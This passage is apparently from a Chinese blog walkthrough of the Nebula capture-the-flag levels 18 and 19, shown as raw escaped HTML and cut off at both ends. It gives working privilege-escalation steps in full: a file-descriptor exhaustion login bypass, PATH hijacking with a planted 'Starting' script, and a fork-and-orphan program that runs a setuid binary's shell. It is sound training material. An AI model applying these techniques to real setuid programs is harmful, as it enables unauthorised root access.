0x08048d43 &amp;lt;+243&amp;gt;:  call   0x8048690 &amp;lt;__stack_chk_fail@plt&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;结合C程序一起看：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;fp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;fopen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PWFILE&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;r&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;64&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fgets&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;fp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="n"&gt;dprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Unable to read password file %s&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;PWFILE&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
                &lt;span class="n"&gt;fclose&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fp&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;strcmp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pw&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;    
  &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="n"&gt;dprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;logged in successfully (with%s password file)&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
    &lt;span class="n"&gt;fp&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt; &lt;span class="o"&gt;?&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;out&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

  &lt;span class="n"&gt;globals&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;loggedin&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;如果if判断为假，就可以直接把全局结构体中的登陆信息设置为1。查阅fopen后可知当文件无法打开时会返回NULL，所以可以想办法让文件无法打开。和反汇编程序对比，可以看到，&lt;code&gt;fclose(fp)&lt;/code&gt;在实际程序中并不存在，也就是文件句柄打开后并不关闭。系统中每个进程可以打开的文件句柄是有限的，当超出限制，资源枯竭，就会返回NULL。因此可以想办法让句柄资源枯竭。&lt;/p&gt;
&lt;p&gt;Linux系统中的可以通过以下方式查看当前打开文件句柄和最大可打开句柄：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;cat /proc/sys/fs/file-nr
cat /proc/sys/fs/file-max
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;但是一般来说，系统会对每个用户的进程作出资源的限制。可以使用ulimit查看限制后的资源情况：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level18@nebula:/home/flag18$ &lt;span class="nb"&gt;ulimit&lt;/span&gt; -Hn
&lt;span class="m"&gt;4096&lt;/span&gt;
level18@nebula:/home/flag18$ &lt;span class="nb"&gt;ulimit&lt;/span&gt; -Sn
&lt;span class="m"&gt;1024&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;可以看到，文件句柄数量硬阈值设定为4096，但对于当前用户只有1024。换句话说，创建1024个文件句柄后就不能再创建了。&lt;/p&gt;
&lt;p&gt;那程序本身会占用多少文件句柄呢？这里我们可以先做个试验，首先运行flag18，并进入调试模式，调试等级最高（因为我们需要调试信息）：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level18@nebula:/home/flag18$ ./flag18 -d /tmp/dbg17 -vvv
login level18
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;输入&lt;code&gt;login level18&lt;/code&gt;并回车，此时理论上应该打开了1个密码文件和1个调试信息文件。但是，当我们切换到TTY2并采用root登陆后（具体方法见level07），使用lsof查看进程句柄信息：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@nebula:~# lsof -c flag18
COMMAND   PID   USER   FD   TYPE DEVICE SIZE/OFF   NODE NAME
flag18  &lt;span class="m"&gt;11848&lt;/span&gt; flag18  cwd    DIR   &lt;span class="m"&gt;0&lt;/span&gt;,18      &lt;span class="m"&gt;100&lt;/span&gt;  &lt;span class="m"&gt;13132&lt;/span&gt; /home/flag18
flag18  &lt;span class="m"&gt;11848&lt;/span&gt; flag18  rtd    DIR   &lt;span class="m"&gt;0&lt;/span&gt;,18      &lt;span class="m"&gt;260&lt;/span&gt;   &lt;span class="m"&gt;6744&lt;/span&gt; /
flag18  &lt;span class="m"&gt;11848&lt;/span&gt; flag18  txt    REG    &lt;span class="m"&gt;7&lt;/span&gt;,0    &lt;span class="m"&gt;12216&lt;/span&gt;  &lt;span class="m"&gt;12922&lt;/span&gt; /home/flag18/flag18
flag18  &lt;span class="m"&gt;11848&lt;/span&gt; flag18  mem    REG    &lt;span class="m"&gt;7&lt;/span&gt;,0  &lt;span class="m"&gt;1544392&lt;/span&gt;  &lt;span class="m"&gt;44973&lt;/span&gt; /lib/i386-linux-gnu/libc-2.13.so
flag18  &lt;span class="m"&gt;11848&lt;/span&gt; flag18  mem    REG    &lt;span class="m"&gt;7&lt;/span&gt;,0   &lt;span class="m"&gt;126152&lt;/span&gt;  &lt;span class="m"&gt;44978&lt;/span&gt; /lib/i386-linux-gnu/ld-2.13.so
flag18  &lt;span class="m"&gt;11848&lt;/span&gt; flag18    0u   CHR  &lt;span class="m"&gt;136&lt;/span&gt;,0      0t0      &lt;span class="m"&gt;3&lt;/span&gt; /dev/pts/0
flag18  &lt;span class="m"&gt;11848&lt;/span&gt; flag18    1u   CHR  &lt;span class="m"&gt;136&lt;/span&gt;,0      0t0      &lt;span class="m"&gt;3&lt;/span&gt; /dev/pts/0
flag18  &lt;span class="m"&gt;11848&lt;/span&gt; flag18    2u   CHR  &lt;span class="m"&gt;136&lt;/span&gt;,0      0t0      &lt;span class="m"&gt;3&lt;/span&gt; /dev/pts/0
flag18  &lt;span class="m"&gt;11848&lt;/span&gt; flag18    3u   REG   &lt;span class="m"&gt;0&lt;/span&gt;,19       &lt;span class="m"&gt;80&lt;/span&gt; &lt;span class="m"&gt;362729&lt;/span&gt; /tmp/dbg17
flag18  &lt;span class="m"&gt;11848&lt;/span&gt; flag18    4r   REG   &lt;span class="m"&gt;0&lt;/span&gt;,17       &lt;span class="m"&gt;31&lt;/span&gt; &lt;span class="m"&gt;344165&lt;/span&gt; /home/flag18/password
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;可以看到，文件实际打开了5个文件句柄，除了刚才说到的两个，还有标准输入、标准输出和错误输出。也就是说对于文件句柄，程序本身占有3个，flag18程序因为调试占有1个，剩下的1024-3-1=1020才是给密码文件的，也就是至少1021个密码文件的打开才能&lt;code&gt;fopen()&lt;/code&gt;失效。于是构造如下命令：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;python -c &lt;span class="s1"&gt;&amp;#39;print &amp;quot;login level8\r\n&amp;quot;*1021&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; ~flag18/flag18 -d /tmp/dbg17 -vvv
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;查看一下调试文件：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level18@nebula:/home/flag18$ cat /tmp/dbg17 &lt;span class="p"&gt;|&lt;/span&gt; tail
got &lt;span class="o"&gt;[&lt;/span&gt;login level8&lt;span class="o"&gt;]&lt;/span&gt; as input
attempting to login
got &lt;span class="o"&gt;[&lt;/span&gt;login level8&lt;span class="o"&gt;]&lt;/span&gt; as input
attempting to login
got &lt;span class="o"&gt;[&lt;/span&gt;login level8&lt;span class="o"&gt;]&lt;/span&gt; as input
attempting to login
got &lt;span class="o"&gt;[&lt;/span&gt;login level8&lt;span class="o"&gt;]&lt;/span&gt; as input
attempting to login
logged in successfully &lt;span class="o"&gt;(&lt;/span&gt;without password file&lt;span class="o"&gt;)&lt;/span&gt;
got &lt;span class="o"&gt;[]&lt;/span&gt; as input
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;可以发现已经登录成功了。下面我们就要调用shell参数：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level18@nebula:/home/flag18$ python -c &lt;span class="s1"&gt;&amp;#39;print &amp;quot;login level8\r\n&amp;quot;*1021+&amp;quot;shell\r\n&amp;quot;&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; ~flag18/flag18 -d /tmp/dbg17 -vvv
/home/flag18/flag18: error &lt;span class="k"&gt;while&lt;/span&gt; loading shared libraries: libncurses.so.5: cannot open shared object file: Error &lt;span class="m"&gt;24&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;利用资源极限这种方式，虽然绕过了登录，却没有办法再创建shell，不过幸好程序本身给我们提供了&lt;code&gt;closelog&lt;/code&gt;，所以我们只需要创建1021个文件绕过登录，之后关闭1个句柄，再打开shell就可以了，于是构造如下命令：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;python -c &lt;span class="s1"&gt;&amp;#39;print &amp;quot;login level8\r\n&amp;quot;*1021+&amp;quot;closelog\r\nshell\r\n&amp;quot;&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; ~flag18/flag18 -d /tmp/dbg17 -vvv
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;执行后shell返回：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;flag18 -d /tmp/dbg17 -vvv
/home/flag18/flag18: -d: invalid option
Usage:  /home/flag18/flag18 &lt;span class="o"&gt;[&lt;/span&gt;GNU long option&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;option&lt;span class="o"&gt;]&lt;/span&gt; ...
    /home/flag18/flag18 &lt;span class="o"&gt;[&lt;/span&gt;GNU long option&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;option&lt;span class="o"&gt;]&lt;/span&gt; script-file ...
GNU long options:
    --debug
    --debugger
    --dump-po-strings
    --dump-strings
    --help
    --init-file
    --login
    --noediting
    --noprofile
    --norc
    --posix
    --protected
    --rcfile
    --restricted
    --verbose
    --version
Shell options:
    -irsD or -c &lt;span class="nb"&gt;command&lt;/span&gt; or -O shopt_option      &lt;span class="o"&gt;(&lt;/span&gt;invocation only&lt;span class="o"&gt;)&lt;/span&gt;
    -abefhkmnptuvxBCHP or -o option
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;这其实是sh本身的问题，因为它把后面的那些命令也认为是它的参数了，而它没有-d参数，所以报错。这里用&lt;code&gt;--init-file&lt;/code&gt;参数可以让它忽略后面的参数。重新构造命令：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;python -c &lt;span class="s1"&gt;&amp;#39;print &amp;quot;login level18\r\n&amp;quot;*1021+&amp;quot;closelog\r\nshell\r\n&amp;quot;&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; ~flag18/flag18 --init-file -d /tmp/dbg17 -vvv &lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&amp;gt;/tmp/log17
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;这里我把整个shell中的输出都放到/tmp/log17中是为了便于查看，shell本身窗口太小了。查阅log17文件发现：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/home/flag18/flag18: invalid option -- &lt;span class="s1"&gt;&amp;#39;-&amp;#39;&lt;/span&gt;
/home/flag18/flag18: invalid option -- &lt;span class="s1"&gt;&amp;#39;i&amp;#39;&lt;/span&gt;
/home/flag18/flag18: invalid option -- &lt;span class="s1"&gt;&amp;#39;n&amp;#39;&lt;/span&gt;
/home/flag18/flag18: invalid option -- &lt;span class="s1"&gt;&amp;#39;i&amp;#39;&lt;/span&gt;
/home/flag18/flag18: invalid option -- &lt;span class="s1"&gt;&amp;#39;t&amp;#39;&lt;/span&gt;
/home/flag18/flag18: invalid option -- &lt;span class="s1"&gt;&amp;#39;-&amp;#39;&lt;/span&gt;
/home/flag18/flag18: invalid option -- &lt;span class="s1"&gt;&amp;#39;f&amp;#39;&lt;/span&gt;
/home/flag18/flag18: invalid option -- &lt;span class="s1"&gt;&amp;#39;i&amp;#39;&lt;/span&gt;
/home/flag18/flag18: invalid option -- &lt;span class="s1"&gt;&amp;#39;l&amp;#39;&lt;/span&gt;
/home/flag18/flag18: invalid option -- &lt;span class="s1"&gt;&amp;#39;e&amp;#39;&lt;/span&gt;
/tmp/dbg17: line &lt;span class="m"&gt;1&lt;/span&gt;: Starting: &lt;span class="nb"&gt;command&lt;/span&gt; not found
/tmp/dbg17: line &lt;span class="m"&gt;2&lt;/span&gt;: got: &lt;span class="nb"&gt;command&lt;/span&gt; not found
/tmp/dbg17: line &lt;span class="m"&gt;3&lt;/span&gt;: attempting: &lt;span class="nb"&gt;command&lt;/span&gt; not found
/tmp/dbg17: line &lt;span class="m"&gt;4&lt;/span&gt;: got: &lt;span class="nb"&gt;command&lt;/span&gt; not found
/tmp/dbg17: line &lt;span class="m"&gt;5&lt;/span&gt;: attempting: &lt;span class="nb"&gt;command&lt;/span&gt; not found
/tmp/dbg17: line &lt;span class="m"&gt;6&lt;/span&gt;: got: &lt;span class="nb"&gt;command&lt;/span&gt; not found
...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;开头调用了&lt;code&gt;Starting&lt;/code&gt;和&lt;code&gt;got&lt;/code&gt;命令，但是两个命令都不存在。那就构造一个命令，这样就能利用漏洞了（/tmp目录下）：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/bin/getflag&amp;quot;&lt;/span&gt; &amp;gt; Starting &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; chmod +x Starting
&lt;span class="nv"&gt;PATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/tmp:&lt;span class="nv"&gt;$PATH&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;再次执行后查看结果：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level18@nebula:/tmp$ cat /tmp/log17 &lt;span class="p"&gt;|&lt;/span&gt; head -20
/home/flag18/flag18: invalid option -- &lt;span class="s1"&gt;&amp;#39;-&amp;#39;&lt;/span&gt;
/home/flag18/flag18: invalid option -- &lt;span class="s1"&gt;&amp;#39;i&amp;#39;&lt;/span&gt;
/home/flag18/flag18: invalid option -- &lt;span class="s1"&gt;&amp;#39;n&amp;#39;&lt;/span&gt;
/home/flag18/flag18: invalid option -- &lt;span class="s1"&gt;&amp;#39;i&amp;#39;&lt;/span&gt;
/home/flag18/flag18: invalid option -- &lt;span class="s1"&gt;&amp;#39;t&amp;#39;&lt;/span&gt;
/home/flag18/flag18: invalid option -- &lt;span class="s1"&gt;&amp;#39;-&amp;#39;&lt;/span&gt;
/home/flag18/flag18: invalid option -- &lt;span class="s1"&gt;&amp;#39;f&amp;#39;&lt;/span&gt;
/home/flag18/flag18: invalid option -- &lt;span class="s1"&gt;&amp;#39;i&amp;#39;&lt;/span&gt;
/home/flag18/flag18: invalid option -- &lt;span class="s1"&gt;&amp;#39;l&amp;#39;&lt;/span&gt;
/home/flag18/flag18: invalid option -- &lt;span class="s1"&gt;&amp;#39;e&amp;#39;&lt;/span&gt;
You have successfully executed getflag on a target account
/tmp/dbg17: line &lt;span class="m"&gt;2&lt;/span&gt;: got: &lt;span class="nb"&gt;command&lt;/span&gt; not found
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;这样第一种方法已经实现。其他方法待续……&lt;/p&gt;
&lt;h1&gt;Nebula level19&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;There is a flaw in the below program in how it operates.&lt;/p&gt;
&lt;p&gt;下面的程序执行方式有漏洞。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;fcntl.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;sys/stat.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;envp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kt"&gt;pid_t&lt;/span&gt; &lt;span class="n"&gt;pid&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;256&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
  &lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;stat&lt;/span&gt; &lt;span class="n"&gt;statbuf&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="cm"&gt;/* Get the parent&amp;#39;s /proc entry, so we can verify its user id */&lt;/span&gt;

  &lt;span class="n"&gt;snprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;/proc/%d&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;getppid&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;

  &lt;span class="cm"&gt;/* stat() it */&lt;/span&gt;

  &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;stat&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;statbuf&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Unable to check parent process&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;EXIT_FAILURE&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;

  &lt;span class="cm"&gt;/* check the owner id */&lt;/span&gt;

  &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;statbuf&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;st_uid&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="cm"&gt;/* If root started us, it is ok to start the shell */&lt;/span&gt;

    &lt;span class="n"&gt;execve&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;envp&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;err&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Unable to execve&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;

  &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;You are unauthorized to run this program&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;首先还是分析程序执行流程：程序启动后调用getppid()函数获取父进程id，之后查找/proc下该id进程是否属于root，如果是root的，则可以根据参数执行shell命令。&lt;/p&gt;
&lt;p&gt;首先去/proc下面看看哪些进程属于root，注意到/proc/1。回想一下Linux进程机制，在父进程创建子进程后，如果父亲在子进程退出前因为种种原因结束了，那子进程就归pid=1的init进程管理了。而init是属于root，所以，我们可以设计一个程序，启动子进程后立马退出，这样子进程的新父进程就是init了：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[])&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;pid_t&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;fork&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;//child&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;sleep&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="n"&gt;execl&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/home/flag19/flag19&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;-c&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;/bin/getflag &amp;gt; /tmp/flag19.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
